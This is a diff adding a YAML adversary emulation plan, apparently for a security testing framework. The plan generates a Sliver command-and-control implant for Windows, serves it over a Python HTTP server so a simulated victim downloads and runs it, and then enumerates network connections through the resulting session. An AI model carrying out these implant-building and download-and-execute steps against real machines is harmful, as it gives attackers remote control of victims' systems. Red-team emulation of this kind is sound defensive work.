@@ -1,0 +1,122 @@
+emulation_plan_details:
+  adversary_name: test
+  creation_time: 2025-04-07 20:39:20 UTC+0000
+attack_action_sequence:
+  - uuid: 0e67b73a-9927-43e1-8f64-04d38f1db57d
+    name: Build Sliver implant
+    id: T1071.001
+    source: Manual
+    supported_platforms:
+      - windows
+    tactics:
+      - Command and Control
+    technique: Application Layer Protocol - Web Protocols
+    description: |
+      The command is used in the Sliver C2 (Command and Control) framework to generate a payload designed for remote access to a target machine.
+    execution:
+      executor: Sliver Console
+      command: |
+        sliver > generate --mlts #{LHOST}:#{LPORT} --os windows --arch 64bit --format exe --save #{SAVE_PATH}
+        sliver > mlts --lport #{LPORT}
+    arguments:
+      LHOST:
+        default:
+        description: IP address of the attacker machine
+        type:
+      LPORT:
+        default:
+        description: listening port of the attacter machine
+        type:
+      SAVE_PATH:
+        default:
+        description: Saved path of the generated payload
+        type:
+  - uuid: 4a31f8db-89db-4f16-baab-47bb3f9d5b8a
+    name: Simulate the victim download and execute malicious payload file
+    id: T1204.002
+    source: Manual
+    supported_platforms:
+      - windows
+    tactics:
+      - Execution
+    technique: |
+      User Execution: Malicious File
+    description:
+    execution:
+      executor: Human
+      command: |
+        (This step needs human interaction and (temporarily) cannot be executed automatically)
+        (On attacker's machine)
+        python -m http.server
+
+        (On victim's machine)
+        1. Open #{LHOST}:#{LPORT} in the browser
+        2. Navigate to the path of the target payload file
+        3. Download the payload file
+        4. Execute the payload file to #{PATH}
+    arguments:
+      LHOST:
+        default:
+        description: IP address of the attacker machine
+        type:
+      LPORT:
+        default:
+        description: listening port of the attacter machine
+        type:
+      SAVE_PATH:
+        default:
+        description: Saved path of the downloaded payload
+        type:
+  - uuid: 1f401bbe-de24-41d2-8e34-d026e25bfb94
+    name: Execute a Sliver Implant Payload
+    id: T1071.001
+    source: Sliver
+    supported_platforms:
+      - windows
+    tactics:
+      - Command and Control
+    technique: Application Layer Protocol - Web Protocols
+    description: |
+      Executing a Sliver implant payload will establish a Sliver session.
+    execution:
+      executor: None
+      command: |
+        None
+    arguments:
+  - uuid: 5f1e4a7c-b6d4-2e8f-1a9c-0b5e9a8b2d3c
+    name: Network Connection Enumeration
+    id:
+      - T1049
+    source: Sliver
+    supported_platforms:
+      - windows
+      - linux
+    tactics:
+      - Discovery
+    technique: |
+      System Network Connections Discovery
+    description: The `netstat` command enumerates active network connections.
+    execution:
+      executor: Sliver Executor
+      command: netstat(#{tcp},#{udp},#{ipv4},#{ipv6},#{listening},#{SessionID})
+    arguments:
+      tcp:
+        description: Show TCP connections (true/false)
+        default: true
+      udp:
+        description: Show UDP connections (true/false)
+        default: true
+      ipv4:
+        description: Show IPv4 connections (true/false)
+        default: true
+      ipv6:
+        description: Show IPv6 connections (true/false)
+        default: true
+      listening:
+        description: Show listening ports (true/false)
+        default: true
+      SessionID:
+        description: The session ID of the active Sliver connection.
+testbed_requirement:
+  OS: []
+  CVE: []
